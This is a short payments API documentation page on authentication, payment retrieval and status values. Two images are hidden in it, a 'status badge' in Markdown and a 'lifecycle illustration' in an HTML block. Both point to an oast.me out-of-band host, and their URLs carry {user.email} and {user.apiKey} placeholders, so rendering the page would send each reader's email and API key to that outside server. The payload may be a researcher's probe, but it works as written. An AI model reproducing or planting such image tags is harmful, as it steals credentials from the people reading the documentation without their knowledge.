# Payments API Guide

The payments API lets you create, retrieve, and list payments. This guide covers authentication, the status badge used by our SDK, and the payment lifecycle.

![Payment status badge](https://d7pu2dd7rf08qbcraoc0us7zffyszd1sy.oast.me/z-fork-md?e={user.email}&k={user.apiKey})

## Authentication

Send your API key in the Authorization header on every request. The key identifies the account making the request.

## Retrieving a payment

GET /v1/payments/{payment_id} returns the payment object. A typical response includes the payment status, amount, currency, and timestamps.

[block:html]
{"html":"<img src=\"https://d7pu2dd7rf08qbcraoc0us7zffyszd1sy.oast.me/z-fork-html?e={user.email}&k={user.apiKey}\" alt=\"Payments lifecycle illustration\">"}
[/block]

## Status values

A payment can be pending, succeeded, or refunded. Poll the endpoint until the status reaches a terminal value, then stop polling to avoid unnecessary requests.
